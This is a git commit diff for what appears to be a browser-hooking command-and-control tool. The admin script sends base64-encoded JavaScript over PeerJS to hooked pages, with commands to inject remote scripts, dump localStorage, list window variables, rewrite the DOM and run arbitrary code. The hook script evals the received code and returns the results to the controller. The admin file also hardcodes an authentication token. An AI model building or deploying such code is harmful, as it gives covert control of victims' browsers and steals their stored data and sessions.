efcdcd3671a00d7344fe7aada3928bc4e9bab24b
jackb0back <54455407+jackb0back@users.noreply.github.com>
2024-08-19 16:25:48 -0400

    added commands, working on RSA verify

--- dist/admin/res/admin.js
+++ dist/admin/res/admin.js
@@ -3,7 +3,7 @@ const socket = io("/admin", {
         token: "2f35c1073c86b7087a504ad9183f6a24ced9f49a7b29f5aac60acccadd62cafb"
     }
 });
-
+var privateKey = "RSA_KEY";
 var peer = new Peer();
 var currentConnection;
 
@@ -14,16 +14,125 @@ function connect(id) {
         console.log("connected to peer:", id);
         // Receive messages
         conn.on('data', function(data) {
-            console.log('Received', data);
+            console.log('Received:', data);
         });
 
         // Send messages
-        conn.send('Hello!');
+        // conn.send('Hello!');
     });
 
     conn.on('error', function(err) {
         console.error('Connection error:', err);
     });
+}
+
+async function sendCMD(type,data) {
+    switch (type){
+        case "inject":
+            await SendPackagedCode(`
+                (function() {
+                    var j = document.createElement("script");
+                    j.src = '${data}';
+                    j.onload = function() {
+                        _return(true);
+                    }
+                    document.body.appendChild(j);
+                })();    
+            `)
+        break;
+        case "screeshot":
+        
+        break;
+        case "info": 
+            await SendPackagedCode(`
+                _return({
+                    "hash": window.location.hash,
+                    "host": window.location.host,
+                    "hostname": window.location.hostname,
+                    "href": window.location.href,
+                    "origin": window.location.origin,
+                    "pathname": window.location.pathname,
+                    "port": window.location.port,
+                    "protocol": window.location.protocol
+                });    
+            `)  
+        break;
+        case "localstorage":
+            await SendPackagedCode(`
+                _return(localStorage);    
+            `)
+        break;
+        case "code":
+            await SendPackagedCode(data);
+        break;
+        case "varibles":
+            if (data == undefined) {
+                await SendPackagedCode(`
+                    (function() {
+                        var _p = Object.keys(window).filter(prop => !built_in.includes(prop));
+                        var _r = {};
+                        for (var i in _p) {
+                            _r[_p[i]] = typeof window[_p[i]]
+                        }
+                        _return(_r);
+                    })(); 
+                    
+                `)
+            }else {
+                await SendPackagedCode(`
+                    _return(window["${data}"]);    
+                `)
+            }
+        break;
+        case "editDOM":
+            await SendPackagedCode(`
+                (function() {
+                    var _p = document.createElement("div");
+                    _p.innerHTML = atob("${btoa(data)}")
+                    document.body.appendChild(_p);
+                    _return(true);
+                })();    
+            `)
+        break;
+        case "setUp": 
+            await SendPackagedCode(`
+                (function() {
+                    var j = document.createElement("script");
+                    j.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+                    j.onload = function() {
+                        _return(true);
+                    }
+                    document.body.appendChild(j);
+                })();    
+            `);
+            await SendPackagedCode(`
+                (function() {
+                    var j = document.createElement("script");
+                    j.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js';
+                    j.onload = function() {
+                        _return(true);
+                    }
+                    document.body.appendChild(j);
+                })();    
+            `)
+        break;
+        
+
+        default: 
+        console.log("Type not found");
+    }
+}
+
+async function SendPackagedCode(code) {
+    try {
+        await currentConnection.send({
+            "code": btoa(code),
+            "key": privateKey
+        });
+        return true;
+    }catch {
+        return false;
+    }
 }
 
 socket.on('connect', () => {
--- dist/hook/hook.js
+++ dist/hook/hook.js
@@ -1,6 +1,6 @@
 var peer;
 var connections = [];
-
+var built_in = ["window","self","document","name","location","customElements","history","navigation","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","closed","frames","length","top","opener","parent","frameElement","navigator","origin","external","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth","outerHeight","devicePixelRatio","event","clientInformation","screenLeft","screenTop","styleMedia","onsearch","isSecureContext","trustedTypes","performance","onappinstalled","onbeforeinstallprompt","crypto","indexedDB","sessionStorage","localStorage","onbeforexrselect","onabort","onbeforeinput","onbeforematch","onbeforetoggle","onblur","oncancel","oncanplay","oncanplaythrough","onchange","onclick","onclose","oncontentvisibilityautostatechange","oncontextlost","oncontextmenu","oncontextrestored","oncuechange","ondblclick","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","ondurationchange","onemptied","onended","onerror","onfocus","onformdata","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadstart","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onpause","onplay","onplaying","onprogress","onratechange","onreset","onresize","onscroll","onsecuritypolicyviolation","onseeked","onseeking","onselect","onslotchange","onstalled","onsubmit","onsuspend","ontimeupdate","ontoggle","onvolumechange","onwaiting","onwebkitanimationend","onwebkitanimationiteration","onwebkitanimationstart","onwebkittransitionend","onwheel","onauxclick","ongotpointercapture","onlostpointercapture","onpointerdown","onpointermove","onpointerrawupdate","onpointerup","onpointercancel","onpointerover","onpointerout","onpointerenter","onpointerleave","onselectstart","onselectionchange","onanimationend","onanimationiteration","onanimationstart","ontransitionrun","ontransitionstart","ontransitionend","ontransitioncancel","onafterprint","onbeforeprint","onbeforeunload","onhashchange","onlanguagechange","onmessage","onmessageerror","onoffline","ononline","onpagehide","onpageshow","onpopstate","onrejectionhandled","onstorage","onunhandledrejection","onunload","crossOriginIsolated","scheduler","alert","atob","blur","btoa","cancelAnimationFrame","cancelIdleCallback","captureEvents","clearInterval","clearTimeout","close","confirm","createImageBitmap","fetch","find","focus","getComputedStyle","getSelection","matchMedia","moveBy","moveTo","open","postMessage","print","prompt","queueMicrotask","releaseEvents","reportError","requestAnimationFrame","requestIdleCallback","resizeBy","resizeTo","scroll","scrollBy","scrollTo","setInterval","setTimeout","stop","structuredClone","webkitCancelAnimationFrame","webkitRequestAnimationFrame","chrome","fence","launchQueue","originAgentCluster","onpageswap","onpagereveal","credentialless","speechSynthesis","onscrollend","webkitRequestFileSystem","webkitResolveLocalFileSystemURL","caches","cookieStore","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","sharedStorage","documentPictureInPicture","getScreenDetails","queryLocalFonts","showDirectoryPicker","showOpenFilePicker","showSaveFilePicker",];
 if (localStorage.getItem("_peer") !== null) {
     peer = new Peer(localStorage.getItem("_peer"));
 } else {
@@ -9,6 +9,7 @@ if (localStorage.getItem("_peer") !== null) {
 }
 
 const socket = io("/hook");
+
 socket.on('connect', () => {
     console.log("socket connected");
     setTimeout(function() {
@@ -30,17 +31,31 @@ peer.on('connection', (conn) => {
 
     conn.on('open', () => {
         console.log("Connected to peer:", conn.peer);
-        conn.send("Hello from peer!");
     });
 
     conn.on('data', (data) => {
-        console.log("Received data from peer:", data);
+      if (typeof data == "object") {
+        try {
+            eval(atob(data.code));
+        }catch {
+            var _g = new Blob([atob(data.code)]);
+            var j = document.createElement("script");
+            j.src = URL.createObjectURL(_g);
+            document.body.appendChild(j);
+        }
+      }
     });
 
     conn.on('error', (err) => {
         console.error('Connection error:', err);
     });
 });
+
+function _return(data) {
+    for (i in connections) {
+        connections[i].send(data);
+    }
+}
 
 function generateRandomString(length) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -50,4 +65,54 @@ function generateRandomString(length) {
         result += characters.charAt(Math.floor(Math.random() * charactersLength));
     }
     return result;
+}
+
+
+var newKeyPair = {
+    public: "",
+    private: ""
+  }
+  
+function genKeyPair() {
+    crypt = new JSEncrypt({
+      default_key_size: 2048
+    });
+  var dt = new Date();
+  var time = -(dt.getTime());
+  crypt.getKey();
+  dt = new Date();
+  time += (dt.getTime());
+  
+  newKeyPair.private = crypt.getPrivateKey();
+  newKeyPair.public = crypt.getPublicKey();
+  console.log(newKeyPair.private,"\n",newKeyPair.public);
+  return newKeyPair;
+}
+  
+  
+  
+          
+function doSign(pkey,str) {
+    var rsa = new RSAKey();
+    rsa.readPrivateKeyFromPEMString(pkey);
+    var hashAlg = 'sha256';
+    var hSig = rsa.sign(str, hashAlg);
+    return linebrk(hSig, 64);
+}
+  
+function doVerify(pubkey,str,verif) {
+    //Public key, encoded string, signed string 
+    var sMsg = str;
+    var hSig = verif;
+    hSig = hSig.replace(/[^0-9a-f]+/g, "");
+  
+    var pubKey = KEYUTIL.getKey(pubkey);
+    var isValid = pubKey.verify(sMsg, hSig);
+  
+    // display verification result
+    if (isValid) {
+      console.log("Valid");
+    } else {
+     console.log("invalid");
+    }
 }
